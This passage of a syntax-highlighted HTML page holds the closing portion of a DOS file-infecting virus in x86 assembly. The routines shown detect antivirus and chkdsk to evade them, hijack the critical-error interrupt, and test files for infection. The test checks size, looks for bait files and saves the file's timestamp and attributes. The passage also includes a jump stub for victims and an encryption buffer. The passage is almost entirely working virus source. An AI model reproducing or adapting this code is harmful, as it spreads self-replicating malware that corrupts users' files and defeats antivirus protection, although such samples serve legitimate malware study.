        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'DK'</span><span class="sc0">    </span><span class="sc1">; chkdsk finds false errors</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">AV_Detected</span><span class="sc0">                </span><span class="sc1">; with directory stealth </span><span class="sc0">
</span><span class="sc5">next8</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCCCh</span><span class="sc0">                   </span><span class="sc1">; Flag NON-AV</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">AV_Detected</span><span class="sc4">:</span><span class="sc0">      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">    </span><span class="sc1">; Screw up the search</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2020h</span><span class="sc0">    </span><span class="sc1">; clear the .XXX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDDDh</span><span class="sc0">                   </span><span class="sc1">; Flag AV</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">HOOK_24</span><span class="sc4">:</span><span class="sc0">                                           </span><span class="sc1">; hook interrupt 24</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">; by direct writes to </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">; the</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">; interrupt vector</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; table</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                     </span><span class="sc1">; DOS will fix it back</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_24h</span><span class="sc0">         </span><span class="sc1">; all by itself.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">    </span><span class="sc1">;  For once, I like what</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">24h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">  </span><span class="sc1">;  DOS does.</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">infection_test</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; assume file </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                         </span><span class="sc1">; open</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">; and bx is handle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1220h</span><span class="sc0">                  </span><span class="sc1">; Get Job File Table</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_out</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1216h</span><span class="sc0">                  </span><span class="sc1">; Get System File Table</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2Fh</span><span class="sc0">                        </span><span class="sc1">; For my file.</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_out</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">    </span><span class="sc1">; change to read/write</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get time</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">time</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get date</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">date</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; get attribs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">attrib</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000d</span><span class="sc0">                  </span><span class="sc1">; size filter</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">filter_error</span><span class="sc0">               </span><span class="sc1">; only infect files bigger</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">                  </span><span class="sc1">; read in 25 bytes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25d</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vict_head</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_out</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc1">; Looking for possible BAIT files.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vict_head</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">                         </span><span class="sc1">; nop test</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">filter_error</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">                        </span><span class="sc1">; INT test</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">filter_error</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vict_head</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">                        </span><span class="sc1">; INT test</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">filter_error</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc0">                        </span><span class="sc1">; INT test</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">filter_error</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">    </span><span class="sc1">; point to beginning</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; could have used SFT</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">    </span><span class="sc1">; point to end</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3h</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vict_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">; infection check</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">vict_head</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCBAh</span><span class="sc0">                    </span><span class="sc1">; me..</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_infected</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">error_out</span><span class="sc4">:</span><span class="sc0">                
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">                    </span><span class="sc1">; FF = infected</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">filter_error</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDDDh</span><span class="sc0">                    </span><span class="sc1">; not infected</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                   </span><span class="sc1">; and DONT infect</span><span class="sc0">
</span><span class="sc5">not_infected</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCCCh</span><span class="sc0">                    </span><span class="sc1">; not infected</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">jmp_create</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">      
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc0"> 
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc0">
</span><span class="sc5">jmp_offset</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc0">
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; -=&lt; end of encryption. &gt;=-</span><span class="sc0">



</span><span class="sc1">; The heap........   junk not needed in main program</span><span class="sc0">

</span><span class="sc5">date</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">              
</span><span class="sc5">victim_name</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">     
</span><span class="sc5">attrib</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">vict_size</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">encryptbuffer</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc4">(</span><span class="sc5">last</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">code</span><span class="sc0">            </span><span class="sc9">ends</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">



</span></div></body>
</html>
